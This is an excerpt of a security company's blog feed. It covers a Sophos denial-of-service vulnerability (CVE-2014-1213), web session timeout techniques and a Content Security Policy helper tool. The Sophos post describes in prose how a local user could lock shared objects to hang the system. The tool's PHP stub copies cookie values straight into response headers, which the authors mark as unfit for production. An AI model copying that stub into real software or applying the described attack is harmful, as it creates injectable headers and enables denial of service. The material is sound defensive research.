<h2>Minimal Effort Web Application Security (a.k.a. how to make my job harder) Sunday 31st @ 12:00 Stage C</h2>
<p>Portcullis member Graham Sutherland will be presenting his quick tips on making your web applications more resistant to common attack vectors, without putting a lot of effort in. Graham says &#8220;In some cases, simply adding a like to a configuration file can completely prevent entire classes of attack from being viable&#8221;. Graham will take a look at hardening against XSS, SQL injection, click jacking, password cracking, and a few other bits if there’s time. &#8220;With any luck, you’ll make my job a lot harder!&#8221;</p>
<p>For those spoilt for choice both talks will be featured in our EMF blog to be posted after the event.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/">EMF Camp 2014 talk</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Windows System Objects and Sophos Endpoint Security</title>
		<link>https://labs.portcullis.co.uk/blog/windows-system-objects-and-sophos-endpoint-security/</link>
		<comments>https://labs.portcullis.co.uk/blog/windows-system-objects-and-sophos-endpoint-security/#comments</comments>
		<pubDate>Mon, 03 Feb 2014 11:30:42 +0000</pubDate>
		<dc:creator><![CDATA[GCS]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[CVE-2014-1213]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[Sophos]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[Windows]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3359</guid>
		<description><![CDATA[<p>Windows system objects are one of the interesting areas of binary application assessments that are often ignored or misunderstood. Many people don&#8217;t realise that abstract Windows application programming concepts such as mutexes, events, semaphores, shared memory sections, and jobs all come together under the purview of the Windows Object Manager. These objects, like those in [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-system-objects-and-sophos-endpoint-security/">Windows System Objects and Sophos Endpoint Security</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Windows system objects are one of the interesting areas of binary application assessments that are often ignored or misunderstood. Many people don&#8217;t realise that abstract Windows application programming concepts such as mutexes, events, semaphores, shared memory sections, and jobs all come together under the purview of the Windows Object Manager. These objects, like those in the filesystem and registry namespaces, have all sorts of interesting security impacts when not properly managed.<span id="more-3359"></span></p>
<p>This blog post relates to an advisory. See <a title="CVE-2014-1213: Denial of Service in Sophos Anti-Virus" href="https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1213/">CVE-2014-1213: Denial of Service in Sophos Anti-Virus</a> for the release.</p>
<p>One of the major differences of the system object namespace, versus filesystem and registry namespaces, is the concept of a default Discretionary Access Control List (DACL). These DACLs are the cornerstone of the Windows security model, and are used to describe which entities (users, groups, etc.) have specific types of access to an object. When you view the permissions on a file or directory, you&#8217;re looking at a direct representation of the DACL for that object. Each rule within a DACL is called an Access Control Entry (ACE). When an object in any namespace is created and the application does not explicitly provide a DACL, the system looks at the parent container to see if it has any ACEs within its DACL that are marked as inheritable. If it finds some, it applies them across into a new DACL for the newly created object. There are special rules around inheritance for containers, but we won&#8217;t get into that here. If there are no inheritable ACEs, it resorts to applying the default DACL for the namespace. This is where things get interesting from a security perspective; the system object namespace, in contrast with registry and filesystem namespaces, has no default DACL. In this situation, the system applies an empty DACL, which allows everyone full access to the object.</p>
<p>This is a corner-case that many developers fall foul of. Objects created in the local container (i.e. the system object container for the current session) inherit some ACEs from the session container, but the global container has no inheritable ACEs, and therefore objects within it that are created without an explicit DACL will end up with an empty DACL. We can see this in action by viewing the DACLs applied to the global and session containers, using a tool such as <a title="WinObj" href="http://technet.microsoft.com/en-gb/sysinternals/bb896657.aspx">WinObj</a>:</p>
<div id="attachment_3364" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-3360"><div class="lb-album"><a href="#image-3360"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/01/winobj_session_container_dacl-300x227.png" alt="DACL applied to session container in the Windows system object namespace." class="size-medium wp-image-3364"><span></span></a></div>              
<a href="#imageclose-3360" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-3360">
                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/01/winobj_session_container_dacl.png" alt="image-3360">
                   </div></a><p class="wp-caption-text">DACL applied to session container in the Windows system object namespace.</p></div>
<div id="attachment_3365" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-3361"><div class="lb-album"><a href="#image-3361"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/01/winobj_global_container_dacl-300x227.png" alt="DACL applied to global container in the Windows system object namespace." class="size-medium wp-image-3365"><span></span></a></div>              
<a href="#imageclose-3361" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-3361">
                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/01/winobj_global_container_dacl.png" alt="image-3361">
                   </div></a><p class="wp-caption-text">DACL applied to global container in the Windows system object namespace.</p></div>
<p>Notice that all the ACEs in the global container are marked as &#8220;Inherit None&#8221;, meaning that child objects will not inherit them as part of their DACL. As such, if you create a system object such as a mutex or an event through the usual CreateMutex or CreateEvent API calls, and fail to explicitly provide a DACL, all users on the system will have unrestricted access to that object.</p>
<p>Whilst digging into security issues around this common mistake, I found a number of vulnerabilities in a range of products. In general the impacts of being able to mess with these were low, usually causing the affected application to lock up or stop working in some way. In Sophos Endpoint Security, however, the impact was more interesting. Most anti-malware software consists of three major sections: a user-facing GUI for controlling and monitoring the product, a high privilege user-mode service for performing various scanning features, and one or more kernel-mode modules (commonly referred to as drivers) that provide filesystem filters, notification of new threads and processes, low-level memory access, hook detection, and other kernel-level functionality. Communicating quickly and reliably between these components is a daunting task, especially when your messages have to traverse across the user-mode / kernel-mode barrier. Enter global system objects. Mutexes, events, semaphores, and shared memory sections in the global container of the system object namespace are all directly accessible from both user-mode and kernel-mode. When combined properly, these object types allow a developer to create an inter-process communications framework that is fast, reliable, and thread-safe.</p>
<p>One example of this might be a feature where a filesystem filter driver needs to notify the user-mode service that new data has been written to disk, so that it can scan it. Three named objects &#8211; an event, a mutex, and a shared memory section &#8211; are created within the global namespace, so that both components can access them. The event is used to signal that a write operation is pending, the mutex is used to ensure that the shared memory section is accessed by only one thread at a time, and the shared memory section is used to hold information about the event. The whole process is rather complex, and is best described in a diagram:</p>
<div style="width: 725px" class="wp-caption alignnone"><img alt="Example IPC mechanism" src="http://i.imgur.com/RA3r5ZS.gif" width="715" height="338" /><p class="wp-caption-text">Diagram of an example IPC mechanism between a user-mode AV service and a kernel-mode file system driver.</p></div>
<p>As you can see, the user-mode service is responsible for checking the write operations before they are allowed. The decision is passed back to the driver, which either completes the write or rejects it, issuing an appropriate error code.</p>
<p>Now, imagine you let a low-privilege user interact with these objects. For one, they may be able to wait on the event object themselves and modify the shared memory section via a race condition. This can be somewhat mitigated by various integrity checks, but isn&#8217;t outside the realms of possibility. Another issue is that all of these components modify their state, and in some cases block execution, when the event and mutex objects are waited upon or signalled. Imagine that a malicious local user acquires the mutex, then signals the event. The user-mode service continues execution (step 7) and attempts to acquire the mutex (step 8), but since the malicious user has already acquired it, the service thread is now blocked. From this point on, the driver&#8217;s calls to have write operations checked go unheeded. Although the architecture is not identical, this is precisely the mechanism in which Sophos Endpoint Security failed.</p>
<p>As <a title="the advisory" href="https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1213/">the advisory</a> describes, CVE-2014-1213 relates to a lack of DACLs applied to system objects. As we discussed above, failure to explicitly supply a DACL when creating system objects results in the object being created with the default DACL for the namespace, which is null (i.e. empty). The impact is that a local low-privilege user can manipulate these objects as they wish. Since this can lead to disk IO requests being ignored, or at least heavily delayed, the system eventually cannot continue. In many cases it simply locks up and becomes unresponsive, as user-mode programs and subsystems (e.g. SMSS / CSRSS) cannot complete blocking disk operations. In some cases, the system will recognise the pattern of failures and forcefully terminate the system with a bugcheck (BSoD) in order to reduce the potential for permanent damage to the system state. Of course, this isn&#8217;t particularly interesting from a security perspective if you only consider a desktop environment, but imagine the impact on a terminal services system with hundreds or thousands of users.</p>
<p>Sophos have now patched this issue in engine 3.50, which went live on the 21st of January. Portcullis have independently verified this fix as being effective after the update is applied and the system is rebooted.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-system-objects-and-sophos-endpoint-security/">Windows System Objects and Sophos Endpoint Security</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-system-objects-and-sophos-endpoint-security/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Improving the security in web sessions (part 2)</title>
		<link>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/</link>
		<comments>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/#comments</comments>
		<pubDate>Fri, 24 Jan 2014 00:02:38 +0000</pubDate>
		<dc:creator><![CDATA[JGO]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2591</guid>
		<description><![CDATA[<p>The previous post about session management was about how to improve the security of web sessions. An aspect which was not addressed in that post is how to identify that a session is not in active use any more but where the user has manually logged out. For example, a user who was using a [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/">Improving the security in web sessions (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>The <a title="previous post" href="/blog/improving-the-security-in-web-sessions/">previous post</a> about session management was about how to improve the security of web sessions. An aspect which was not addressed in that post is how to identify that a session is not in active use any more but where the  user has manually logged out. For example, a user who was using a banking application and closed the tab without logging out the application.<span id="more-2591"></span></p>
<p>This point is also crucial for web applications because, computers and web browsers are frequently shared between people so it is important that this case cannot be exploited. Identifying when the user stops working with a web application and terminating the session reduces the window of opportunity that surrounds this type of attacks.</p>
<p>Although web applications should always include a &#8220;Log out&#8221; button, it is even naive to think that all the users are going to close their sessions when they finish to use a web application or before closing the tab/web browser where it was loaded.</p>
<h2>Using JavaScript events</h2>
<p>JavaScript allows to control an event which is fired at the moment of a browser window or a browser tab is closed. The name of this event is onbeforeunload. In fact, this event is fired before a page is unloaded, that includes: closing the tab, reloading the page, using the browser&#8217;s navigation buttons, click on a link&#8230;</p>
<p>The implementation of how the web browser acts when this event is launched depends on the web browser. In general, this event can be used to display a message box asking the user if he wants to close the current page. This message box contains two buttons to allow the user to choose between completing the action, closing the tab, or staying in the page.</p>
<p>So, in principle, it could be possible to detect when the user is closing the page and then send a request to the server with his confirmation. But the fact is that the majority of the web browsers do not return the control to the JavaScript interpreter before closing the tab; so it is not possible to send the request only in those cases that the user decides that he actually wants to close the tab (the event can always send a request before asking the user, but in few browsers will be able to do it after confirmation).</p>
<p>It was possible to check that Firefox returns the control to the JavaScript interpreter, but depending on the version, this only works when the page is reloaded, but not when a tab or the browser is closed (tested with versions 23 and 24). In the same way, Opera version 17 will send the logout request when the browser is closed, but not if the user closes is the tab. The rest of the tested browsers (Safari , IE and Chrome) did not send anything if the user confirmed the tab/browser closing.</p>
<p>The following code is an example about how to implement it:</p>
<pre class="brush: xml; first-line: 1; title: ; notranslate">
&lt;html&gt;
&lt;script src=&quot;http://code.jquery.com/jquery-1.10.2.min.js&quot;&gt;

// Not using JQuery
/*
window.onbeforeunload = function () {
    return  &quot;Are you sure want to LOGOUT the session ?&quot;;
};

// Used to logout the session , when browser window was closed
window.onunload = function () {
    $.get( &quot;http://127.0.0.1/logout&quot; );
};
*/

// Using JQuery
$(window).on('beforeunload', function() {
        return 'Are you sure want to LOGOUT the session ?';
});

$(window).unload(function() {
        $.get( &quot;http://127.0.0.1/logout&quot; );
});
&lt;/script&gt;

&lt;body&gt;
  &lt;h1&gt;&lt;i&gt;Unload&lt;/i&gt; and &lt;i&gt;Beforeunload&lt;/i&gt; example&lt;/h1&gt;
  Please, reload, close this tab or close the browser to launch the test.
&lt;/body&gt;
&lt;/html&gt;
</pre>
<p>So, as you would be able to note, this is not a suitable solution to the original problem outlined at the start of this post.</p>
<h2>Using AJAX ping</h2>
<p>A better approach, because it should work in any web browser, is to reduce the session timeout configuration in the server to few minutes (2-5 minutes) and to ping the server regularly (15-30 seconds) with an AJAX request. The ping request will maintain the sessions life on the web server, preventing it from being timed out unintentionally. On the other hand, if the user closes the tab or the browser, the session will be terminated by the web server after the determined period.</p>
<p>The code below is a possible implementation of an AJAX ping using jQuery:</p>
<pre class="brush: jscript; first-line: 1; title: ; notranslate">
$(function() { window.setInterval(&quot;$.post('http://example.com/keepAlive');&quot;, 15000); });
</pre>
<p>This line should be included in every web page of the application, so it would be a good idea to create a file with it and include the file in the contents of every page served by the web serve.</p>
<p>With this solution, there are two problems:</p>
<ul>
<li>The server will need to be able to support the load of the ping requests which, depending on the number of users, could be thousands each minute. But an application which had that number of users should be able to support that load, so this is not a real problem.</li>
<li>If the user leaves the application opened in a browser without supervision, the session will never time out.</li>
</ul>
<p>The way to fix the second problem is to count the number of pings the server received without any other kind of request and to configure the application to close the session after the corresponding time (idle time). The time limit will need to be longer than the session timeout that has been configured, to avoid those cases of users who are using the application but staying in the same page for a while. For example:</p>
<p>Imagine that the session timeout was configured to 2 minutes and the delay between pings, 15 seconds. That means that after closing the browser, the session will remain live for 2 minutes maximum before being closed. That is a suitable period of time for the web server to wait before timing the session out because it will tolerate some network or connectivity problems which could in principal cause some of the pings to be lost (8 ping requests would have to be lost to close the session by mistake).</p>
<p>The major problem is the idle time, which will have to be configured depending on the kind of application. If the web application contains long articles, the idle time should be set to a longer period (5-10 minutes). If the application consists of small pages, then the idle time could be configured to the same as the session timeout (but never shorter).</p>
<p>By doing this, the application will cover:</p>
<ul>
<li>If the tab or web browser is closed, the session will be terminated after session time out (2 minutes in the example).</li>
<li>If the users leaves the application unattended, the session will be closed after the idle time (at least as long as the session time out but no more than 10 minutes).</li>
<li>While the user is working with the application, the session will be remain active.</li>
</ul>
<p>A last improvement would be to use a variable time out. So it could be configured to the same period as the session time out in most cases but could also be increased for those pages which will take longer to read.</p>
<p>Editor&#8217;s note: If you enjoyed our two articles on how to improve session management, we&#8217;ve asked the author to put together a good practice guide detailing these and other practical steps that can be employed to help keep your users safe.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/">Improving the security in web sessions (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions-part-2/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Improving the security in web sessions (part 1)</title>
		<link>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/</link>
		<comments>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/#comments</comments>
		<pubDate>Thu, 09 Jan 2014 14:14:18 +0000</pubDate>
		<dc:creator><![CDATA[JGO]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2012</guid>
		<description><![CDATA[<p>Session management is a crucial part of web applications and therefore it is also the target of numerous kinds of attacks. Critical web applications, such as banking applications, require complete control of the users&#8217; sessions to prevent abuses or session hijacking attacks. One way to complicate these types of attack, is for the web application [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/">Improving the security in web sessions (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Session management is a crucial part of web applications and therefore it is also the target of numerous kinds of attacks. Critical web applications, such as banking applications, require complete control of the users&#8217; sessions to prevent abuses or session hijacking attacks.<span id="more-2012"></span></p>
<p>One way to complicate these types of attack, is for the web application to have the complete control of the user session. Typically web applications use a session token, normally in the form of a cookie, to identify sessions but they do not normally check anything else to verify the legitimacy of the session. So if an attacker can retrieve the token used by an authenticated user in some manner, usually the attacker can steal the victim&#8217;s session by sending the retrieved token within each request.</p>
<p>However, if the web application tightly controls the state of the user inside the application, it would be very difficult for an attacker to steal his session if the user is still interacting with it. Let me explain it with an example:</p>
<p>Imagine an application whose flow can be represented with the following diagram:</p>
<p><a name="imageclose-2013"><div class="lb-album"><a href="#image-2013"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/FlowDiagram2-300x166.png" alt="FlowDiagram" class="size-medium wp-image-2013 aligncenter"><span></span></a></div>              
<a href="#imageclose-2013" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-2013">
                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/FlowDiagram2.png" alt="image-2013">
                   </div></a></p>
<p>In the initial state, users would not be logged into the application and, until they do so, they will stay in that state. After a login to the application, they get access to the private area of the application where there are 3 different pages. From any of those pages, the user can finish their session by going to the logout page. Inside the private area, users only can browse the pages in the order: 1 -&gt; 2 -&gt; 3 -&gt; 1 -&gt; 2 &#8230; Any other interaction which is not represented by an arrow in the diagram would not be allowed (for example, going from 2 to 1).</p>
<p>In this context, each session could be represented by the usual session token and the state which the user is in. Doing that, if an attacker was able to retrieve the token in order to attempt to gain access to the application, they would try to access a random state which potentially wouldn&#8217;t correspond with any of the following valid states.</p>
<p>For example, if the legitimate user is in the state &#8220;Private Page 1&#8243; at the moment of the attack, the only 2 possible next states are &#8220;Private Page 2&#8243; and &#8220;Log out&#8221;. An attacker would need to know this and if they did not, the application could detect the attack and invalidate the session. It is true, that this can be done by exploiting other vulnerabilities, such as a Cross-site Scripting in the application, but if so, the application will store that the new user state is, for example &#8220;Private Page 2&#8243;. Therefore, when the legitimate user tries to get access to the next state (remember that they were actually in the &#8220;Private Page 1&#8243; state), the application will detect the irregularity and will terminate the session.</p>
<p>Hence, although the attacker would be able to retrieve the token and to perform several requests by discovering the state of the user, the application will identify the problem if the user continues using the application and the states of the user and the attacker become desynchronised.</p>
<p>In this scenario, an attacker who successfully locates another suitable vulnerability in the web application (the XSS talked above) might be able to identify the state of the user, allowing them to retrieve the token and the state and to refresh the web browser of the user by changing the session token. By doing so, the attacker would be able to use the session but the user will detect that something weird happened as their session will likely be terminated.</p>
<p>To avoid this situation, the application should protect against the use of concurrent logins. So when the legitimate user logs in again, the application will detect the second session of the same user and will terminate both sessions.</p>
<p>A limitation of this solution is that legitimate users cannot have more than one tab in the same browser on the same application because each tab would be in different states causing the application to identify the scenario as a possible attack and terminate an otherwise legitimate session. Browsers&#8217; navigation buttons (back and forward) would provoke the same eventualities because the user could change between states in the client side &#8220;bypassing&#8221; the control of the web application.</p>
<p>In order to implement this, the server side application would need to be designed like a <a title="state machine" href="http://en.wikipedia.org/wiki/Finite-state_machine">state machine</a> where all the relationships between the states are defined. The application will need, therefore, to store the current state of the user inside his session and to check that every request came from the current state and that it is addressed to any of the states which are accessible from the current.</p>
<p>The tokens used to mitigate <a title="Cross-site Request Forgery (CSRF)" href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-site Request Forgery (CSRF)</a> attacks could be used to check the state where the users come from. If the token received by the application with each request matches the token sent to the user previously, this means that the user is coming from a valid state. One of the problem with this approach is that all the requests will need to include the CSRF token (including GET requests) and most libraries do not allow this check for GET requests. Another problem of the usage of the CSRF token is that the solution implemented by many frameworks consists uses one unique token which is sent through all the application but which does not change between requests. In this instance, it would not be possible to differentiate between two different states.</p>
<p>A different approach could be to check the HTTP header &#8220;Referer&#8221; from each request. In this case, the state could be represented by the URL from where the user is navigating from (remember that this header cannot be trivially manipulated by using JavaScript &#8211; only the web browser has access to it). Alternatively, instead of the &#8220;Referer&#8221; header, an extra hidden field could be added in each form and link which saves the state and preserves it between requests.</p>
<p>Each approach has its benefits and its problems so probably a mixed solution would be better, using the CSRF to preserve the valid states between requests and checking the &#8220;Referer&#8221; HTTP header to check previous states.</p>
<p>So, summarising:</p>
<ul>
<li>Web session security can be improved by understanding web applications like a state machine and checking the state of each user in each request.</li>
<li>Advantages: this approach prevents and/or complicate attacks to the session, such as session hijacking. Furthermore, it might complicate the usage of guessable/default accounts if another user is using it because concurrent sessions must be avoided.</li>
<li>Disadvantages: users cannot use the application in different tabs and the interaction with it is limited to the actions offered in each page, rejecting the usage of web browsers navigation buttons.</li>
<li>Two possible implementation consist of checking the &#8220;Referer&#8221; HTTP header and/or the CSRF token sent within each request.</li>
</ul>
<p>In the next post, I will address another problem relating to web sessions management, how to identify when an user is no longer using the application, and how to close the session as soon as possible.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/">Improving the security in web sessions (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/improving-the-security-in-web-sessions/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>cspCalculator</title>
		<link>https://labs.portcullis.co.uk/tools/cspcalculator/</link>
		<comments>https://labs.portcullis.co.uk/tools/cspcalculator/#comments</comments>
		<pubDate>Wed, 08 Jan 2014 15:35:09 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Tools]]></category>
		<category><![CDATA[HTML5]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1110</guid>
		<description><![CDATA[<p>cspCalculator is a PoC implementation of a dynamic Content Security Policy creator. Key features Allows on the fly manipulation of Content Security Policy Enables UX developers to get visual feedback on how a CSP affects the application functionality Minimises the changes required to an existing application to allow this to happen Overview Content Security Policies [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/cspcalculator/">cspCalculator</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>cspCalculator is a PoC implementation of a dynamic <a title="Content Security Policy" href="http://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> creator.<span id="more-1110"></span></p>
<h2>Key features</h2>
<ul>
<li>Allows on the fly manipulation of Content Security Policy</li>
<li>Enables UX developers to get visual feedback on how a CSP affects the application functionality</li>
<li>Minimises the changes required to an existing application to allow this to happen</li>
</ul>
<h2>Overview</h2>
<p>Content Security Policies are a new feature of modern browsers that support HTML 5 designed to augment the traditional Same Origin Policy of browsers and help to limit the potential impact of Cross-site Scripting and other content manipulation vulnerabilities that may exist within a given web site and which could be exploited by an attacker. It allows allows web site owners to declare approved sources of content that browsers should be allowed to load on that page out-of-band through the use of additional HTTP headers.</p>
<p>The aim here is to minimise the leg work for UX developers in creating web applications that both function and utilise secure development practices. We do this by reducing the server side code changes down to the injection of some client side JavaScript along with a few lines of server side stub code (in this case, in PHP). Once this has been integrated into application in a staging environment, the UX developer can tweak the CSP from their own browser and see how it affects the application functionality :).</p>
<h2>Installation</h2>
<ul>
<li>Copy styles and js from src/html to your web root</li>
<li>Copy index.php from src/html/examples/php to your web root or tweak your existing web pages in a similar fashion</li>
</ul>
<h2>Usage</h2>
<p>The client side code (HTML) should include the following changes:</p>
<pre class="brush: jscript; title: ; notranslate">
&lt;head&gt;
...
	&lt;link rel=&quot;stylesheet&quot; href=&quot;styles/cspCalculator.css&quot; type=&quot;text/css&quot;/&gt;
...
&lt;/head&gt;
&lt;body&gt;
	&lt;script src=&quot;js/cspCalculator.js&quot;&gt;&lt;/script&gt;
	...
&lt;/body&gt;
</pre>
<p>This will result in the CSS and JavaScript used to construct the cspCalculator UI being injected into resultant pages.</p>
<p>Additionally, as a minimum case, the server side code should implement the following logic:</p>
<pre class="brush: php; title: ; notranslate">
$directiveslist = array(&quot;default-src&quot;, &quot;connect-src&quot;, &quot;font-src&quot;, &quot;frame-src&quot;, &quot;img-src&quot;, &quot;media-src&quot;, &quot;object-src&quot;, &quot;script-src&quot;, &quot;style-src&quot;, &quot;sandbox&quot;);
$headerslist =  array(&quot;Content-Security-Policy&quot;, &quot;X-Content-Security-Policy&quot;, &quot;X-WebKit-CSP&quot;);
foreach ($directiveslist as $directivename) {
	header(&quot;Set-Cookie: &quot; . $directivename . &quot;=&quot; . $_COOKIE[$directivename], false);
}
foreach ($headerslist as $headername) {
	$headervalue = &quot;&quot;;
	foreach ($directiveslist as $directivename) {
		$headervalue .= &quot;; &quot; . $directivename . &quot; &quot; . $_COOKIE[$directivename];
	}
	header($headername . &quot;: &quot; . $headervalue);
}
</pre>
<p>We use cookies as a back channel to allow changes to the Content Security Policy by the UX developer from the UI to easily be signaled back to the web application so that the appropriate headers can be set. Cookies work nicely for this purpose as they do not interfere with any GET or POST parameters that the application may need to send for normal operation.</p>
<p>Once operational, your web application will now include a drop down cspCalculator box on each of its pages. Within the drop down you will see various text boxes for each of the CSP directives that can be defined. The &#8220;Calculate&#8221; button next to each will attempt to determine the appropriate policy by examining the page&#8217;s DOM (something that isn&#8217;t 100% effective yet). The &#8220;Apply&#8221; button will force a round-trip to the server to force it to send the page with the new CSP headers applied. It is recommended that you use this tool in combination with something such as Chrome&#8217;s Inspect Element feature to identify any DOM elements that are blocked and which cspCalculator is unable to identify automatically.</p>
<p><em>cspCalculator should not be deployed in a production environment, since the setting of cookies and/or a CSP by use of header() calls may itself introduce other classes of vulnerability. Rather, once the appropriate CSP has been identified it should be set statically through the use of header() (as in PHP) or other similar calls.</em></p>
<h2>Examples</h2>
<p>Since cspCalculator isn&#8217;t particularly easy to demonstrate in a static context, a demo version has been deployed for your amusement. This can be found on at <a title="www.cspcalculator.org" href="http://www.cspcalculator.org/">www.cspcalculator.org</a>. It has been presented on a separate domain to minimise the risks outlined above in the Usage section of this page.</p>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-2').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/cspCalculator-0.2.tar.gz" target="_blank" title="Download CspCalculator-0.2 Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="CspCalculator-0.2 Tar" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/cspCalculator-0.2.tar.gz" title="Download cspCalculator-0.2.tar.gz" target="_blank" id="wpfb-file-link-2">cspCalculator-0.2.tar.gz</a>
    
    <br />
    November 29, 2013<br />
    
  </div>
  <div class="info">
    14.2 KiB<br />
    MD5 hash: 496b55e3ffa575178428d1d85e42e113 <br />
    <a href="#" onclick="return wpfilebase_filedetails(2);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails2" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>November 29, 2013</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/tools/cspcalculator/">cspCalculator</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/tools/cspcalculator/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
